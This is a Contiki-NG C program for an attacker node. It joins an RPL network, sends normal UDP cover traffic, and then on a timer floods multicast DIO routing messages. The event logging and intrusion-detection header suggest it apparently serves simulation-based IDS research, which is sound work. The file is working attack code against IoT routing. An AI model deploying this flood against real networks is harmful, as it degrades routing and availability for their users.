/* Neighbour attack: floods multicast DIOs on a timer while behaving
 * otherwise normally (joins RPL, sends CBR UDP). */
#include "attacker-common.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "ids.h"

#define ATTACK_TYPE "neighbor"

static struct simple_udp_connection udp_conn;
static uint32_t tx_count;
static uint32_t atk_sent;

PROCESS(attacker_process, "RPL neighbour attacker");
AUTOSTART_PROCESSES(&attacker_process);
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(attacker_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer atk_start_timer;
  static struct etimer atk_timer;
  static struct etimer atk_end_timer;
  static uint8_t attacking;
  static char buf[16];
  uip_ipaddr_t root;

  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, APP_UDP_CLIENT_PORT, NULL,
                      APP_UDP_SERVER_PORT, NULL);
  printf("ATK\tinfo\t%s\tstart=%u\tdur=%u\tperiod_ms=%u\n",
         ATTACK_TYPE, ATTACK_START_SEC, ATTACK_DURATION_SEC, ATTACK_PERIOD_MS);

  etimer_set(&send_timer, random_rand() % (APP_SEND_INTERVAL_SEC * CLOCK_SECOND));
  etimer_set(&atk_start_timer, ATTACK_START_SEC * CLOCK_SECOND);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* Normal cover traffic. */
    if(etimer_expired(&send_timer)) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&root)) {
        snprintf(buf, sizeof(buf), "%lu", (unsigned long)tx_count);
        simple_udp_sendto(&udp_conn, buf, strlen(buf), &root);
        printf("TX\t%lu\n", (unsigned long)tx_count);
        tx_count++;
      }
      etimer_set(&send_timer, APP_SEND_INTERVAL_SEC * CLOCK_SECOND
                 - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }

    /* Begin the attack. */
    if(ev == PROCESS_EVENT_TIMER && data == &atk_start_timer && !attacking) {
      attacking = 1;
      printf("ATK\tstart\t%s\t%u\n", ATTACK_TYPE, ATTACK_PERIOD_MS);
      etimer_set(&atk_timer, attack_next_delay());
      if(ATTACK_DURATION_SEC > 0) {
        etimer_set(&atk_end_timer, ATTACK_DURATION_SEC * CLOCK_SECOND);
      }
    }

    /* Inject one multicast DIO per tick while attacking. */
    if(attacking && ev == PROCESS_EVENT_TIMER && data == &atk_timer) {
      if(curr_instance.used) {
        rpl_icmp6_dio_output(NULL);
        printf("ATK\tsend\t%s\t%lu\n", ATTACK_TYPE, (unsigned long)atk_sent++);
      }
      etimer_set(&atk_timer, attack_next_delay());
    }

    /* End the attack. */
    if(attacking && ATTACK_DURATION_SEC > 0 &&
       ev == PROCESS_EVENT_TIMER && data == &atk_end_timer) {
      attacking = 0;
      etimer_stop(&atk_timer);
      printf("ATK\tstop\t%s\t%lu\n", ATTACK_TYPE, (unsigned long)atk_sent);
    }
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
